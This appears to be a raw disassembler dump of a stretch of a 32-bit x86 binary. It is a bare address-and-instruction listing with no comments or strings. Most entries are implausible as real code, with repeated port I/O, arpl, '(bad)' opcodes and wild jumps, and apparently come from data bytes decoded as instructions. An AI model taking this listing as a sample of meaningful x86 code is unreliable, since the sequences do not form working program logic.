  4184bc:	out    0x3,eax
  4184be:	push   ebx
  4184bf:	add    eax,0x5630407
  4184c4:	mov    DWORD PTR [ebx],0x83c78553
  4184ca:	arpl   WORD PTR [ebp-0x7a9cfc39],ax
  4184d0:	mov    DWORD PTR [ebx-0x7c187a8d],0x3e78573
  4184da:	arpl   WORD PTR [ebp-0x7a9c7c19],ax
  4184e0:	out    0x3,eax
  4184e2:	push   ebx
  4184e3:	add    eax,0x5630407
  4184e8:	pop    es
  4184e9:	add    al,0x73
  4184eb:	test   edi,esp
  4184ed:	xor    DWORD PTR [ebx+0x5],0x7
  4184f1:	add    al,0x73
  4184f3:	add    eax,0x85638407
  4184f8:	out    0x3,eax
  4184fa:	arpl   WORD PTR ds:0x856303e7,ax
  418500:	out    0x83,eax
  418502:	arpl   WORD PTR ds:0x55383c7,ax
  418508:	out    0x3,eax
  41850a:	jae    0x418491
  41850c:	mov    DWORD PTR [ebx],0x3c70573
  418512:	arpl   WORD PTR [ebp+0x3e7],ax
	...
  418524:	add    BYTE PTR [ebx+0x5],ah
  418527:	out    0x83,eax
  418529:	push   ebx
  41852a:	add    eax,0x4e0c900
  41852f:	add    cl,ch
  418531:	loopne 0x418527
  418533:	jg     0x41851e
  418535:	pusha  
  418536:	cmc    
  418537:	jg     0x418542
  418539:	out    0x5,eax
  41853b:	add    cl,ch
  41853d:	pusha  
  41853e:	add    eax,0xf5e70900
  418543:	dec    DWORD PTR [eax]
  418545:	pop    edi
  418546:	cmc    
  418547:	jg     0x418532
  418549:	pusha  
  41854a:	cmc    
  41854b:	dec    DWORD PTR [eax]
  41854d:	fild   WORD PTR ds:0xf560e980
  418553:	jg     0x41853e
  418555:	loopne 0x41854c
  418557:	jg     0x418542
  418559:	loopne 0x418560
  41855b:	add    cl,ch
  41855d:	pusha  
  41855e:	cmc    
  41855f:	jg     0x41854a
  418561:	loopne 0x418568
  418563:	or     cl,0x60
  418566:	add    eax,0xf5e0c900
  41856b:	jg     0x418536
  41856d:	loopne 0x418564
  41856f:	dec    eax
  418571:	pusha  
  418572:	add    eax,0x5e0e900
  418577:	add    cl,ch
  418579:	pusha  
  41857a:	add    eax,0x5df0980
  41857f:	add    cl,ch
  418581:	loopne 0x418578
  418583:	jg     0x41856e
  418585:	pusha  
  418586:	cmc    
  418587:	dec    DWORD PTR [eax]
	...
  418595:	add    BYTE PTR [eax],al
  418597:	add    BYTE PTR [edi+0x5],ah
  41859a:	or     BYTE PTR [ecx],0x5f
  41859d:	cmc    
  41859e:	dec    DWORD PTR [eax]
  4185a0:	out    0x5,eax
  4185a2:	or     cl,0x60
  4185a5:	add    eax,0xf560c980
  4185aa:	(bad)  
  4185ab:	call   0xe9417b90
  4185b0:	pusha  
  4185b1:	add    eax,0x887a0000
  4185b6:	add    BYTE PTR [eax+0x88aa],al
  4185bc:	mov    cl,BYTE PTR [eax]
  4185be:	add    BYTE PTR [eax-0x7feff766],al
  4185c4:	pop    edx
  4185c5:	adc    DWORD PTR [eax],0x10884a80
  4185cb:	add    BYTE PTR [edx+0x6],al
  4185ce:	add    BYTE PTR [eax],al
  4185d0:	cmp    al,BYTE PTR [esi]
  4185d2:	add    cl,BYTE PTR [eax]
  4185d4:	cmp    cl,BYTE PTR [eax]
  4185d6:	add    BYTE PTR [eax],al
  4185d8:	xor    cl,BYTE PTR [eax]
  4185da:	add    cl,BYTE PTR [eax]
  4185dc:	dec    edx
  4185dd:	push   es
  4185de:	add    BYTE PTR [eax],cl
  4185e0:	cmp    cl,BYTE PTR [eax]
  4185e2:	add    BYTE PTR [eax],al
  4185e4:	xor    al,BYTE PTR [esi]
  4185e6:	add    al,BYTE PTR [eax]
  4185e8:	or     al,BYTE PTR [esi]
  4185ea:	add    BYTE PTR [eax],cl
  4185ec:	add    cl,BYTE PTR [eax]
  4185ee:	add    al,BYTE PTR [eax]
  4185f0:	add    cl,BYTE PTR [eax]
  4185f2:	add    BYTE PTR [eax],cl
  4185f4:	adc    cl,BYTE PTR [eax]
  4185f6:	add    BYTE PTR [eax],cl
  4185f8:	or     cl,BYTE PTR [eax]
  4185fa:	add    al,BYTE PTR [eax]
	...
  418608:	add    BYTE PTR [eax],al
  41860a:	add    BYTE PTR [edx],al
  41860c:	push   es
  41860d:	add    cl,BYTE PTR [eax]
  41860f:	add    cl,BYTE PTR [eax]
  418611:	add    al,BYTE PTR [eax]
  418613:	cli    
  418614:	pop    es
  418615:	add    cl,BYTE PTR [eax]
  418617:	rol    BYTE PTR ds:0x7ca0000,cl
  41861d:	add    BYTE PTR [eax],cl
  41861f:	ret    0x7
  418622:	add    BYTE PTR [edx-0x35f7fdfb],bh
  418628:	add    eax,0x5ca0000
  41862d:	add    al,BYTE PTR [eax]
  41862f:	mov    edx,0xb2080207
  418634:	pop    es
  418635:	add    cl,BYTE PTR [eax]
  418637:	xchg   edx,eax
  418638:	add    eax,0xa6630002
  41863d:	(bad)  
  41863e:	call   FWORD PTR [ebx-0x62]
  418641:	inc    DWORD PTR [ecx]
  418643:	arpl   WORD PTR [esi-0x699cfdff],bx
  418649:	(bad)  
  41864a:	jmp    FWORD PTR [ebx-0x5a]
  41864d:	add    DWORD PTR [eax],eax
  41864f:	arpl   WORD PTR [esi-0x61a4fe01],sp
  418655:	(bad)  
  418656:	jmp    DWORD PTR [ebx-0x64]
  418659:	add    DWORD PTR [eax],eax
  41865b:	imul   ebx,DWORD PTR [edi+edi*8+0x19c5b01],0x0
  418663:	pop    ebx
  418664:	xchg   esp,eax
  418665:	add    DWORD PTR [edx],eax
  418667:	arpl   WORD PTR [edi+edi*8+0x19c63ff],dx
  41866e:	add    al,BYTE PTR [eax]
	...
  41867c:	add    BYTE PTR [eax],al
  41867e:	arpl   WORD PTR [edi+edi*8-0x63a4ff],bx
  418685:	jmp    FWORD PTR [ebx-0x64]
  418688:	add    DWORD PTR [eax],eax
  41868a:	arpl   WORD PTR [edi+edi*8+0x1a463ff],bx
  418691:	add    ah,BYTE PTR [ebx-0x6c]
  418694:	inc    DWORD PTR [ecx]
  418696:	imul   ebx,DWORD PTR [edi+edi*8+0x1a46bff],0x0
  41869e:	pop    ebx
  41869f:	pushf  
  4186a0:	(bad)  
  4186a1:	jmp    DWORD PTR [ebx-0x64]
  4186a4:	add    DWORD PTR [eax],eax
  4186a6:	arpl   WORD PTR [ecx+eax*1-0x5b94fe],dx
  4186ad:	call   FWORD PTR [ebx-0x64]
  4186b0:	add    DWORD PTR [edx],eax
  4186b2:	arpl   WORD PTR [ecx+eax*1-0x6b9500],bx
  4186b9:	add    DWORD PTR [ebx-0x5c],ebp
  4186bc:	add    DWORD PTR [eax],eax
  4186be:	arpl   WORD PTR [edi+edi*8-0x18fa9cff],sp
  4186c5:	add    DWORD PTR [ecx+0x5],esp
  4186c8:	out    dx,eax
  4186c9:	add    esp,DWORD PTR [ebx-0x3]
  4186cc:	out    0x3,al
  4186ce:	popa   
  4186cf:	std    
  4186d0:	fiadd  WORD PTR [ecx]
  4186d2:	arpl   bp,di
  4186d4:	out    dx,al
  4186d5:	add    DWORD PTR [ebx+0x5],esp
  4186d8:	out    0x3,eax
  4186da:	popa   
  4186db:	std    
  4186dc:	fiadd  WORD PTR [ecx]
  4186de:	popa   
  4186df:	add    eax,0x3df
	...
  4186f0:	add    BYTE PTR [ebx+0x5],ah
  4186f3:	out    dx,eax
  4186f4:	add    esp,DWORD PTR [ecx-0x3]
  4186f7:	out    0x5,al
  4186f9:	popa   
  4186fa:	add    eax,0x5cce3e8
  4186ff:	push   0x688a44e4
  418704:	in     al,0x3c
  418706:	mov    ah,BYTE PTR [edi+0x4]
  418709:	arpl   WORD PTR ds:0x5ace467,ax
  41870f:	push   0xe804e304
  418714:	add    esp,ebx
  418716:	add    al,0xe8
  418718:	jecxz  0x41872e
  41871a:	mov    ah,bh
  41871c:	add    esp,DWORD PTR [ebx+0x5]
  41871f:	out    0xe3,eax
  418721:	test   BYTE PTR ds:0x57ce3e7,al
  418727:	push   0x680574e4
  41872c:	add    al,0x63
  41872e:	add    eax,0x56303e7
  418733:	addr16 add al,0xe3
  418736:	add    al,0xe8
  418738:	add    esp,ebx
  41873a:	add    al,0xe8
  41873c:	add    esp,DWORD PTR [ebx+0x5]
  41873f:	out    0xe3,eax
  418741:	les    ecx,FWORD PTR [ecx+0x4e303e7]
  418747:	call   0x46bc2f
  41874c:	imul   esp,DWORD PTR [edi+0x5],0x8560e900
  418753:	add    al,ch
	...
  418761:	add    BYTE PTR [eax],al
  418763:	add    BYTE PTR [eax+0x7f69fd89],al
  418769:	mov    ebp,edi
  41876b:	push   0xe8008567
  418770:	pusha  
  418771:	add    eax,0x89876900
  418776:	std    
  418777:	imul   ebx,DWORD PTR [edi-0x7b],0x8980e900
  41877e:	std    
  41877f:	imul   edi,DWORD PTR [edi+0x9],0x9406800
  418786:	add    BYTE PTR [eax+0x60],ch
  418789:	add    eax,0x85606900
  41878e:	add    al,ch
  418790:	pusha  
  418791:	test   DWORD PTR [eax],eax
  418793:	jmp    0x684190d8
  418798:	inc    eax
  418799:	or     DWORD PTR [eax],eax
  41879b:	push   0xe9000560
  4187a0:	pusha  
  4187a1:	add    eax,0x560e900
  4187a6:	add    cl,ch
  4187a8:	add    BYTE PTR [ecx],cl
  4187aa:	add    BYTE PTR [ecx+0x0],ch
  4187ad:	mov    ebp,edi
  4187af:	imul   esp,DWORD PTR [eax-0x7b],0x85606800
  4187b6:	add    al,ch
  4187b8:	pusha  
  4187b9:	add    eax,0x900e800
  4187be:	add    BYTE PTR [eax+0x0],ch
  4187c1:	mov    ebp,edi
  4187c3:	push   0x69fd88c0
	...
  4187d4:	add    BYTE PTR [eax],al
  4187d6:	add    BYTE PTR [eax+0x5],ah
  4187d9:	add    BYTE PTR [eax-0x40],ch
  4187dc:	or     BYTE PTR [eax],al
  4187de:	push   0x560
  4187e3:	retf   
  4187e4:	add    al,0x0
  4187e6:	add    dl,cl
  4187e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e9:	std    
  4187ea:	(bad)  
  4187eb:	mov    ebx,0xbb008004
  4187f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f1:	std    
  4187f2:	dec    DWORD PTR [edx]
  4187f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f5:	jge    0x4187f7
  4187f7:	or     eax,DWORD PTR [eax+eax*4]
  4187fa:	add    BYTE PTR [ebx-0x5c],bh
  4187fd:	std    
  4187fe:	(bad)  
  4187ff:	cli    
  418800:	mov    ds:0x48afffd,eax
  418805:	add    BYTE PTR [eax],0x8b
  418808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418809:	jge    0x41880b
  41880b:	cli    
  41880c:	add    eax,DWORD PTR [eax]
  41880e:	add    BYTE PTR [edx+0x4],bh
  418811:	add    BYTE PTR [eax],0x4a
  418814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418815:	std    
  418816:	dec    edx
  418818:	mov    eax,ds:0x33a007d
  41881d:	add    BYTE PTR [eax],al
  41881f:	cmp    al,BYTE PTR [ebx]
  418821:	or     BYTE PTR [edx],al
  418823:	dec    edx
  418824:	add    al,0x8
  418826:	add    cl,BYTE PTR [edx+0x3]
  418829:	add    BYTE PTR [edx+0x3a],al
  41882c:	add    al,0x8
  41882e:	add    BYTE PTR [edx],bh
  418830:	add    eax,DWORD PTR [eax]
  418832:	add    BYTE PTR [edx],cl
  418834:	add    al,0x0
  418836:	inc    eax
  418837:	or     al,BYTE PTR [eax+ecx*1]
  41883a:	add    al,BYTE PTR [eax]
	...
  418848:	add    BYTE PTR [eax],al
  41884a:	cli    
  41884b:	add    cl,BYTE PTR [eax]
  41884d:	inc    eax
  41884e:	cli    
  41884f:	add    ecx,DWORD PTR [eax]
  418851:	add    BYTE PTR [edx],cl
  418853:	add    eax,DWORD PTR [eax]
  418855:	add    cl,BYTE PTR [edx]
  418857:	add    ecx,DWORD PTR [eax]
  418859:	inc    eax
  41885a:	cli    
  41885b:	add    al,BYTE PTR [eax]
  41885d:	inc    edx
  41885e:	cli    
  41885f:	add    ecx,DWORD PTR [eax]
  418861:	inc    edx
  418862:	retf   0x802
  418865:	add    dl,cl
  418867:	add    eax,DWORD PTR [eax]
  418869:	inc    eax
  41886a:	arpl   WORD PTR [esi-0x619effff],bx
  418870:	add    DWORD PTR [eax],ecx
  418872:	and    ebx,DWORD PTR [esi-0x61dcf7ff]
  418878:	add    DWORD PTR [eax],eax
  41887a:	arpl   WORD PTR [esi-0x61dcfffe],bx
  418880:	add    cl,BYTE PTR [eax]
  418882:	and    DWORD PTR [esi-0x61def7fe],ebx
  418888:	add    al,BYTE PTR [eax]
  41888a:	popa   
  41888b:	sahf   
  41888c:	add    DWORD PTR [eax],ecx
  41888e:	and    DWORD PTR [esi-0x61dcfffe],ebx
  418894:	add    DWORD PTR [eax],eax
  418896:	arpl   WORD PTR [esi-0x61deffff],bx
  41889c:	add    cl,BYTE PTR [eax]
  41889e:	popa   
  41889f:	sahf   
  4188a0:	add    DWORD PTR [eax],eax
  4188a2:	popa   
  4188a3:	pushf  
  4188a4:	add    DWORD PTR [eax],eax
  4188a6:	mov    eax,ds:0x6308029c
  4188ab:	pushf  
  4188ac:	add    DWORD PTR [eax],ecx
	...
  4188ba:	add    BYTE PTR [eax],al
  4188bc:	add    BYTE PTR [ebx-0x64],ah
  4188bf:	add    al,BYTE PTR [eax]
  4188c1:	mov    eax,ds:0x6300029c
  4188c6:	pushf  
  4188c7:	add    DWORD PTR [eax],eax
  4188c9:	popa   
  4188ca:	pushf  
  4188cb:	add    DWORD PTR [eax],eax
  4188cd:	mov    ds:0x6108019c,eax
  4188d2:	pushf  
  4188d3:	add    al,BYTE PTR [eax]
  4188d5:	mov    eax,ds:0xa308029c
  4188da:	pushf  
  4188db:	add    al,BYTE PTR [eax]
  4188dd:	popa   
  4188de:	pushf  
  4188df:	add    DWORD PTR [eax],eax
  4188e1:	mov    ds:0xa108019c,eax
  4188e6:	pushf  
  4188e7:	add    cl,BYTE PTR [eax]
  4188e9:	popa   
  4188ea:	pushf  
  4188eb:	add    cl,BYTE PTR [eax]
  4188ed:	mov    ds:0x6300029c,eax
  4188f2:	add    eax,0x36303e7
  4188f7:	out    0x3,eax
  4188f9:	pop    ebx
  4188fa:	inc    ebx
  4188fb:	out    0x2,eax
  4188fd:	pop    ebx
  4188fe:	inc    ebx
  4188ff:	out    0x2,eax
  418901:	imul   eax,DWORD PTR ds:0x436303e7,0xffffffe7
  418908:	add    bl,BYTE PTR [ebx+0x43]
  41890b:	out    0x3,eax
  41890d:	pop    ebx
  41890e:	add    esp,edi
  418910:	add    esp,DWORD PTR [ebx+0x5]
  418913:	out    0x3,eax
  418915:	imul   eax,DWORD PTR [ebp-0x19],0x3
  418919:	arpl   WORD PTR [ebx-0x19],ax
  41891c:	add    bl,BYTE PTR [ebx+0x5]
  41891f:	out    0x2,eax
	...
  41892d:	add    BYTE PTR [eax],al
  41892f:	add    BYTE PTR [ebx+0x3],ah
  418932:	out    0x2,eax
  418934:	arpl   WORD PTR [ebp-0x19],ax
  418937:	add    ebx,DWORD PTR [ebx+0x5]
  41893a:	out    0x3,eax
  41893c:	arpl   WORD PTR ds:0x456b03e7,ax
  418942:	out    0x4,eax
  418944:	imul   eax,DWORD PTR [ebx],0xffffffe7
  418947:	add    al,0x63
  418949:	inc    ebp
  41894a:	test   DWORD PTR [ebx],0x3e6e563
  418950:	mov    ds:0x6343e6e5,eax
  418955:	add    eax,0xe5a343d7
  41895a:	out    0x3,al
  41895c:	mov    ds:0x6303d6e5,eax
  418961:	add    eax,0xe5a343f7
  418966:	out    0x3,al
  418968:	mov    ds:0x6343e705,eax
  41896d:	in     eax,0xf6
  41896f:	inc    ebx
  418970:	mov    ds:0xa303e705,eax
  418975:	add    eax,0xe56303d7
  41897a:	(bad)  
  41897b:	fsub   DWORD PTR [eax+0x45]
  41897e:	add    cl,ch
  418980:	and    BYTE PTR ds:0x560e920,al
  418986:	and    cl,bh
  418988:	and    BYTE PTR ds:0x560e900,al
  41898e:	add    cl,bh
  418990:	pusha  
  418991:	inc    ebp
  418992:	add    cl,bl
	...
  4189a0:	add    BYTE PTR [eax],al
  4189a2:	add    BYTE PTR [eax],ah
  4189a4:	add    eax,0x520e920
  4189a9:	add    cl,ch
  4189ab:	and    BYTE PTR [ebp+0x0],al
  4189ae:	fldenv [eax]
  4189b0:	add    eax,0x560f920
  4189b5:	add    cl,bh
  4189b7:	pusha  
  4189b8:	inc    ebp
  4189b9:	and    cl,bh
  4189bb:	pusha  
  4189bc:	inc    ebp
  4189bd:	and    cl,ch
  4189bf:	pusha  
  4189c0:	add    eax,0x4520d900
  4189c5:	add    cl,ch
  4189c7:	and    BYTE PTR [ebp+0x20],al
  4189ca:	fldenv [eax]
  4189cc:	add    eax,0xc5a0e900
  4189d1:	(bad)  
  4189d2:	call   0xe9614f77
  4189d7:	pusha  
  4189d8:	add    eax,0x5a0e920
  4189dd:	and    cl,bh
  4189df:	pusha  
  4189e0:	add    eax,0xc560d900
  4189e5:	pop    ds
  4189e6:	jmp    0xd9414f8b
  4189eb:	mov    al,ds:0x60e91fc5
  4189f0:	(bad)  
  4189f3:	mov    al,ds:0x60f90005
  4189f8:	add    eax,0xc560e920
  4189fd:	(bad)  
  4189fe:	call   0x618fa3
  418a03:	or     cl,BYTE PTR [ecx]
  418a05:	add    BYTE PTR [eax],ah
	...
  418a13:	add    BYTE PTR [eax],al
  418a15:	add    BYTE PTR [edx],cl
  418a17:	leave  
  418a18:	(bad)  
  418a19:	dec    DWORD PTR [edx]
  418a1b:	or     DWORD PTR [eax],eax
  418a1d:	and    BYTE PTR [edx-0x35dfc038],bh
  418a23:	enter  0x3f,0xba
  418a27:	or     BYTE PTR [eax+0x20],al
  418a2a:	retf   0x3fc8
  418a2d:	add    dl,cl
  418a2f:	enter  0x203f,0xca
  418a33:	or     BYTE PTR [eax],al
  418a35:	add    BYTE PTR [edx-0x75dfbff8],cl
  418a3b:	or     BYTE PTR [eax],al
  418a3d:	add    BYTE PTR [edx-0x75000038],cl
  418a43:	or     BYTE PTR [eax+0x20],al
  418a46:	mov    cl,al
  418a48:	aas    
  418a49:	add    BYTE PTR [edx-0x38],bh
  418a4c:	(bad)  
  418a4d:	(bad)  
  418a4e:	jp     0x418a58
  418a50:	inc    eax
  418a51:	add    BYTE PTR [edx+0x7a1fffc8],bl
  418a57:	or     BYTE PTR [eax],al
  418a59:	add    BYTE PTR [edx-0x38],bh
  418a5c:	aas    
  418a5d:	and    BYTE PTR [edx+0x8],cl
  418a60:	add    BYTE PTR [eax],ah
  418a62:	pop    edx
  418a63:	or     BYTE PTR [eax+0x0],al
  418a66:	dec    edx
  418a67:	enter  0x1fff,0x3a
  418a6b:	or     BYTE PTR [eax],ah
  418a6d:	add    BYTE PTR [eax+0x8],cl
  418a70:	and    BYTE PTR [eax+ecx*2],al
  418a73:	cmp    ch,0x3
  418a76:	cmp    cl,BYTE PTR [eax]
	...
  418a88:	add    BYTE PTR [edx],bh
  418a8a:	cmp    ch,0xff
  418a8d:	or     BYTE PTR [eax-0x7ff7fc03],al
  418a93:	sbb    eax,0x1d7ffa00
  418a98:	add    al,0x63
  418a9a:	jo     0x418a95
  418a9c:	pop    ds
  418a9d:	outs   dx,BYTE PTR ds:[si]
  418a9f:	add    DWORD PTR [eax],esp
  418aa1:	arpl   WORD PTR [esi+0x1],bp
  418aa4:	add    BYTE PTR [ebx+0x70],ah
  418aa7:	add    DWORD PTR [eax],eax
  418aa9:	pop    edi
  418aaa:	jo     0x418aad
  418aac:	add    BYTE PTR [ebx+0x6e],ah
  418aaf:	add    DWORD PTR [eax],eax
  418ab1:	pop    edi
  418ab2:	jo     0x418ab5
  418ab4:	and    BYTE PTR [edi+0x70],ah
  418ab7:	stc    
  418ab8:	inc    esp
  418aba:	ins    DWORD PTR es:[edi],dx
  418abb:	stc    
  418abc:	jmp    DWORD PTR [eax+0x70]
  418abf:	stc    
  418ac0:	pop    ds
  418ac1:	arpl   WORD PTR [eax+0x1],si
  418ac4:	and    BYTE PTR [ebx+0x6e],ah
  418ac7:	stc    
  418ac8:	jmp    DWORD PTR [eax+0x70]
  418acb:	add    DWORD PTR [eax],eax
  418acd:	outs   dx,BYTE PTR ds:[si]
  418acf:	add    DWORD PTR [eax],esp
  418ad1:	pop    edi
  418ad2:	outs   dx,BYTE PTR ds:[esi]
  418ad3:	stc    
  418ad4:	pop    ds
  418ad5:	addr16 jo 0x418ad9
  418ad8:	and    BYTE PTR [ebx+0x6e],ah
  418adb:	add    DWORD PTR [eax],esp
  418add:	outs   dx,BYTE PTR ds:[si]
  418adf:	stc    
  418ae0:	push   DWORD PTR [edi+ebp*2-0x7]
  418ae4:	jmp    FWORD PTR [edi+ebp*2-0x7]
  418ae8:	pop    ds
  418ae9:	pop    edi
  418aea:	outs   dx,BYTE PTR ds:[esi]
  418aeb:	stc    
  418aec:	pop    ds
	...
  418af9:	add    BYTE PTR [eax],al
  418afb:	add    BYTE PTR [ebx+0x6e],ah
  418afe:	add    DWORD PTR [eax],eax
  418b00:	arpl   WORD PTR [ecx+eax*1+0x0],bp
  418b04:	ins    BYTE PTR es:[di],dx
  418b06:	stc    
  418b07:	pop    ds
  418b08:	arpl   WORD PTR [ecx+eax*1+0x0],bp
  418b0c:	ins    BYTE PTR es:[di],dx
  418b0e:	stc    
  418b0f:	pop    ds
  418b10:	arpl   WORD PTR [ecx+eax*1+0x20],bp
  418b14:	arpl   WORD PTR [esi-0x7],bp
  418b17:	jmp    DWORD PTR [eax+0x6e]
  418b1a:	stc    
  418b1b:	jmp    DWORD PTR [eax+0x6e]
  418b1e:	add    DWORD PTR [eax],esp
  418b20:	pop    edi
  418b21:	add    eax,0x94303e9
  418b26:	jmp    0xe946ee2e
  418b2b:	add    eax,DWORD PTR [ebx+0x5]
  418b2e:	out    0x3,eax
  418b30:	arpl   WORD PTR [ecx],cx
  418b32:	out    0xfb,eax
  418b34:	in     al,dx
  418b35:	push   es
  418b36:	out    0x3,eax
  418b38:	inc    ebx
  418b39:	add    eax,0x97cfbe7
  418b3e:	jmp    0xe9c4603e
  418b43:	sti    
  418b44:	ins    BYTE PTR es:[edi],dx
  418b45:	add    eax,0x964fbe7
  418b4a:	jmp    0xe9c4484a
  418b4f:	add    esp,DWORD PTR [ebx+0x9]
  418b52:	jmp    0xe74ad852
  418b57:	add    eax,DWORD PTR [ebx+0x7cfbe709]
  418b5d:	add    eax,0x3e7
	...
  418b6e:	add    BYTE PTR [ebx+0x5],ah
  418b71:	jmp    0xe946ee79
  418b76:	sti    
  418b77:	fs or  edi,esp
  418b7a:	add    esp,DWORD PTR [ebx+0x5]
  418b7d:	jmp    0xe746e07d
  418b82:	add    eax,DWORD PTR [ebx+0x9]
  418b85:	out    0xfb,eax
  418b87:	fs sub cl,0x3
  418b8b:	arpl   WORD PTR [ecx],cx
  418b8d:	out    0xfb,eax
  418b8f:	push   esp
  418b90:	push   es
  418b91:	out    0xfb,eax
  418b93:	dec    esp
  418b94:	sub    cl,0x3
  418b97:	add    DWORD PTR ds:0x123cf427,0xffffffe7
  418b9e:	repz xor al,0x82
  418ba1:	out    0x3,eax
  418ba3:	addr16 add eax,0x1560f427
  418ba9:	add    cl,ch
  418bab:	pusha  
  418bac:	add    eax,0x820f2910
  418bb1:	or     eax,0x56729
  418bb6:	jmp    0x2951911b
  418bbb:	or     DWORD PTR [bx+si],eax
  418bbe:	jmp    0x29519523
  418bc3:	test   DWORD PTR ds:0x5f0e910,0x5d0e900
  418bcd:	adc    BYTE PTR [ecx],ch
  418bcf:	iret   
  418bd0:	add    eax,0xe900
	...
  418be1:	add    al,dl
  418be3:	cmp    ebp,0x560a9
  418be9:	jmp    0xa951954e
  418bee:	pusha  
  418bef:	add    eax,0x81b0e910
  418bf4:	or     eax,0xfd81b0a9
  418bf9:	jmp    0xa941918e
  418bfe:	pusha  
  418bff:	or     DWORD PTR [eax],eax
  418c01:	test   eax,0xe9100960
  418c06:	nop
  418c07:	add    eax,0x8170a910
  418c0c:	std    
  418c0d:	jmp    0xe9419172
  418c12:	pusha  
  418c13:	add    eax,0x960a900
  418c18:	adc    BYTE PTR [ecx-0x16effaa0],ch
  418c1e:	push   eax
  418c1f:	or     DWORD PTR ds:0x55729,0x960e9
  418c29:	sub    DWORD PTR [edi],esi
  418c2b:	add    eax,0x960e900
  418c30:	add    BYTE PTR [eax],al
  418c32:	cmp    dh,BYTE PTR [ebp+0x1]
  418c35:	adc    BYTE PTR [edx],bh
  418c37:	jne    0x418c36
  418c39:	dec    DWORD PTR [edx+0x9]
  418c3c:	add    BYTE PTR [eax],al
  418c3e:	dec    edx
  418c3f:	or     DWORD PTR [eax+edx*1],eax
  418c42:	cli    
  418c43:	je     0x418c42
  418c45:	inc    DWORD PTR [eax]
	...
  418c53:	add    BYTE PTR [eax],al
  418c55:	cmp    bh,BYTE PTR [ecx+0x1]
  418c58:	add    BYTE PTR [edx],cl
  418c5a:	jne    0x418c59
  418c5c:	cmovp  ecx,DWORD PTR [ecx]
  418c5f:	add    BYTE PTR [eax],al
  418c61:	cmp    cl,BYTE PTR [ecx]
  418c63:	add    BYTE PTR [eax],dl
  418c65:	cli    
  418c66:	add    al,0x4
  418c68:	adc    BYTE PTR [edx-0x35effbf7],cl
  418c6e:	add    al,0x0
  418c70:	adc    BYTE PTR [edx-0x5fffbfc],bh
  418c76:	je     0x418c75
  418c78:	bswap  edx
  418c7a:	add    al,0x0
  418c7c:	add    BYTE PTR [edx],cl
  418c7e:	jne    0x418c81
  418c80:	adc    dl,bh
  418c82:	add    al,0x4
  418c84:	add    dl,bh
  418c86:	add    al,0x0
  418c88:	adc    BYTE PTR [edx-0x75effbfc],cl
  418c8e:	je     0x418c8d
  418c90:	btr    DWORD PTR [ebp+edi*8+0xf],0x7a
  418c96:	add    al,0x0
  418c98:	add    dl,cl
  418c9a:	je     0x418c9d
  418c9c:	adc    BYTE PTR [edx+0x7a000174],cl
  418ca2:	je     0x418ca5
  418ca4:	add    BYTE PTR [edx+0xafffd74],bh
  418caa:	je     0x418ca9
  418cac:	dec    DWORD PTR [edx]
  418cae:	add    al,0x4
  418cb0:	add    BYTE PTR [edx],bh
  418cb2:	add    al,0x0
  418cb4:	adc    BYTE PTR [edx],bh
  418cb6:	je     0x418cb9
  418cb8:	adc    BYTE PTR [eax],al
	...
  418cc6:	add    BYTE PTR [eax],al
  418cc8:	arpl   WORD PTR [esi+0x2f],ax
  418ccb:	push   DWORD PTR [esi+ebp*2]
  418cce:	add    DWORD PTR [eax],eax
  418cd0:	arpl   WORD PTR [esi+0x1],bp
  418cd3:	add    BYTE PTR [ebx-0x1a],ah
  418cd6:	sub    edi,edi
  418cd8:	sbb    al,0x42
  418cda:	sub    edi,edi
  418cdc:	adc    al,0xf2
  418cde:	sub    edi,edi
  418ce0:	or     al,0x6e
  418ce2:	add    DWORD PTR [eax],eax
  418ce4:	arpl   WORD PTR [esi+0x1],bp
  418ce7:	add    BYTE PTR [ebx+0x74],ah
  418cea:	sub    bh,bh
  418cec:	hlt    
  418ced:	and    eax,0xa5ecff2e
  418cf2:	sub    al,0xff
  418cf4:	in     al,0x6d
  418cf6:	add    DWORD PTR [eax],eax
  418cf8:	arpl   WORD PTR [esi+0x1],bp
  418cfb:	add    BYTE PTR [ebx-0x42],ah
  418cfe:	sub    bh,bh
  418d00:	int3   
  418d01:	push   ecx
  418d02:	sub    edi,edi
  418d04:	(bad)  
  418d05:	int    0x2b
  418d07:	(bad)  
  418d08:	mov    esp,0x6300016d
  418d0d:	outs   dx,BYTE PTR ds:[esi]
  418d0e:	add    DWORD PTR [eax],eax
  418d10:	arpl   dx,dx
  418d12:	jmp    DWORD PTR es:[ecx+edx*2+0x699cff2b]
  418d1a:	sub    bh,bh
  418d1c:	xchg   esp,eax
  418d1d:	ins    DWORD PTR es:[edi],dx
  418d1e:	add    DWORD PTR [eax],eax
  418d20:	arpl   WORD PTR [esi+0x1],bp
  418d23:	add    BYTE PTR [ebx+0x6c],ah
  418d26:	and    edi,edi
  418d28:	jl     0x418d1f
  418d2a:	sub    eax,0xff
	...
  418d3b:	je     0x418db6
  418d3d:	sub    bh,bh
  418d3f:	ins    BYTE PTR es:[edi],dx
  418d40:	ins    DWORD PTR es:[edi],dx
  418d41:	add    DWORD PTR [eax],eax
  418d43:	arpl   WORD PTR [esi+0x1],bp
  418d46:	add    BYTE PTR [ebx-0x4c],ah
  418d49:	and    edi,edi
  418d4b:	push   esp
  418d4c:	int    0x2d
  418d4e:	dec    DWORD PTR [esi+eax*1+0x7]
  418d52:	sub    eax,DWORD PTR [edi+edi*2-0x19]
  418d56:	add    esp,DWORD PTR [ebx+0x5]
  418d59:	out    0x3,eax
  418d5b:	arpl   WORD PTR ds:0x7f2c2361,ax
  418d61:	xchg   ebx,eax
  418d62:	sub    eax,0x2afb7f24
  418d67:	sbb    al,0x7f
  418d69:	out    0x3,eax
  418d6b:	arpl   WORD PTR ds:0x56303e7,ax
  418d71:	icebp  
  418d72:	and    al,BYTE PTR [edi+edi*2]
  418d75:	scas   eax,DWORD PTR es:[edi]
  418d76:	sub    eax,0x2aff7efc
  418d7b:	hlt    
  418d7c:	jle    0x418d65
  418d7e:	add    esp,DWORD PTR [ebx+0x5]
  418d81:	out    0x3,eax
  418d83:	arpl   WORD PTR ds:0x7edc22bd,ax
  418d89:	jnp    0x418db8
  418d8b:	aam    0x7e
  418d8d:	out    0x3,eax
  418d8f:	arpl   WORD PTR ds:0x56303e7,ax
  418d95:	out    0x3,eax
  418d97:	arpl   WORD PTR ds:0x56303e7,ax
